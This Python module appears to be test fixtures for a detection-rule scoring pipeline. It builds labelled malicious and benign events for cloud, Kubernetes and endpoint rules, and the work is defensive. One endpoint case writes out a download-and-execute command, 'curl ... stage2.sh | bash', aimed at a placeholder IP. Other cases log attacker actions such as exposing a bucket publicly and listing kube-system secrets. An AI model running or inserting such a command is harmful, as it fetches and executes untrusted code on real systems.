"""
Attack simulation replays used to score detection rule quality.

Each replay bundles:
  - a set of normalized events (some malicious, some benign "noise")
  - ground truth: which event_ids SHOULD trigger which rule_id

Running these against the detection engine produces true positives,
false positives, and false negatives per rule -- which is what feeds
the lifecycle dashboard's precision/recall/latency metrics.

This is intentionally simple (static fixtures) rather than a live
attack-emulation framework like Atomic Red Team, but it mirrors the same
idea at portfolio scale: known-bad + known-good events, scored against
rules, tracked over time.
"""

import os
import sys
from dataclasses import dataclass

sys.path.append(os.path.join(os.path.dirname(__file__), "..", "ingestion"))
from schema import NormalizedEvent  # noqa: E402


@dataclass
class ReplayCase:
    name: str
    event: NormalizedEvent
    expected_rule_id: str | None  # None means this event should NOT fire any rule


def build_replay_cases() -> list[ReplayCase]:
    cases = []

    # --- True positive: public bucket policy ---
    cases.append(ReplayCase(
        name="malicious_public_bucket_policy",
        expected_rule_id="DR-CLOUD-001",
        event=NormalizedEvent(
            event_id="replay-001",
            timestamp="2026-07-08T15:00:00Z",
            source_type="cloud",
            source_system="aws_cloudtrail",
            actor_user="compromised-svc-account",
            actor_type="IAMUser",
            action="PutBucketPolicy",
            outcome="success",
            target_resource="s3.amazonaws.com",
            source_ip="198.51.100.23",
            raw={
                "eventName": "PutBucketPolicy",
                "requestParameters": {
                    "bucketPolicy": '{"Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}]}'
                },
            },
        ),
    ))

    # --- True negative (benign): private bucket policy update ---
    cases.append(ReplayCase(
        name="benign_private_bucket_policy_update",
        expected_rule_id=None,
        event=NormalizedEvent(
            event_id="replay-002",
            timestamp="2026-07-08T15:05:00Z",
            source_type="cloud",
            source_system="aws_cloudtrail",
            actor_user="platform-admin",
            actor_type="IAMUser",
            action="PutBucketPolicy",
            outcome="success",
            target_resource="s3.amazonaws.com",
            source_ip="10.1.2.3",
            raw={
                "eventName": "PutBucketPolicy",
                "requestParameters": {
                    "bucketPolicy": '{"Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::621397680139:role/ci"},"Action":"s3:GetObject"}]}'
                },
            },
        ),
    ))

    # --- True positive: kube-system secrets listed by service account ---
    cases.append(ReplayCase(
        name="malicious_kube_system_secrets_list",
        expected_rule_id="DR-K8S-001",
        event=NormalizedEvent(
            event_id="replay-003",
            timestamp="2026-07-08T15:10:00Z",
            source_type="kubernetes",
            source_system="k8s_audit",
            actor_user="system:serviceaccount:default:compromised-runner",
            actor_type="ServiceAccount",
            action="list",
            outcome="200",
            target_resource="secrets",
            target_namespace="kube-system",
            source_ip="10.0.4.99",
            raw={"verb": "list", "requestURI": "/api/v1/namespaces/kube-system/secrets"},
        ),
    ))

    # --- True negative (benign): secrets list in dev namespace ---
    cases.append(ReplayCase(
        name="benign_dev_namespace_secrets_list",
        expected_rule_id=None,
        event=NormalizedEvent(
            event_id="replay-004",
            timestamp="2026-07-08T15:12:00Z",
            source_type="kubernetes",
            source_system="k8s_audit",
            actor_user="system:serviceaccount:default:dev-tooling",
            actor_type="ServiceAccount",
            action="list",
            outcome="200",
            target_resource="secrets",
            target_namespace="dev",
            source_ip="10.0.4.55",
            raw={"verb": "list", "requestURI": "/api/v1/namespaces/dev/secrets"},
        ),
    ))

    # --- True positive: curl | bash download-and-execute ---
    cases.append(ReplayCase(
        name="malicious_curl_pipe_bash",
        expected_rule_id="DR-EDR-001",
        event=NormalizedEvent(
            event_id="replay-005",
            timestamp="2026-07-08T15:15:00Z",
            source_type="endpoint",
            source_system="edr",
            actor_user="j.doe",
            actor_type="human",
            action="process_start",
            outcome="observed",
            target_resource="curl",
            raw={"command_line": "curl -s http://198.51.100.77/stage2.sh | bash"},
        ),
    ))

    # --- True negative (benign): legitimate install script ---
    cases.append(ReplayCase(
        name="benign_homebrew_install",
        expected_rule_id=None,
        event=NormalizedEvent(
            event_id="replay-006",
            timestamp="2026-07-08T15:16:00Z",
            source_type="endpoint",
            source_system="edr",
            actor_user="d.zaki",
            actor_type="human",
            action="process_start",
            outcome="observed",
            target_resource="curl",
            raw={"command_line": "curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"},
        ),
    ))

    # --- Known gap: exec into prod pod during off-hours (no rule covers *time*) ---
    cases.append(ReplayCase(
        name="malicious_prod_exec",
        expected_rule_id="DR-K8S-002",
        event=NormalizedEvent(
            event_id="replay-007",
            timestamp="2026-07-08T03:00:00Z",
            source_type="kubernetes",
            source_system="k8s_audit",
            actor_user="system:serviceaccount:default:compromised-runner",
            actor_type="ServiceAccount",
            action="create",
            outcome="201",
            target_resource="pods",
            target_namespace="prod",
            raw={"verb": "create", "requestURI": "/api/v1/namespaces/prod/pods/payments-abc12/exec"},
        ),
    ))

    return cases
